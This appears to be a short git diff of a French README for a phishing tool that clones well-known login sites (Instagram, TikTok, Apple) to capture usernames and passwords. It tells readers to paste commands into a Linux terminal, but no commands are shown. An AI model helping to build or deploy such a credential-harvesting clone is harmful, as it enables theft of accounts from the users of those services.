@@ -1,7 +1,7 @@
 
 # linux hack faux site : mots de passe et identifiant repris
 
-cela va servir a cloner des sites connu parfaitement   
+cela va servir a cloner des sites connu parfaitement  (insta,tiktok,apple...)  
 
 copier toutes les commande une a une dans le terminal linux :  
  
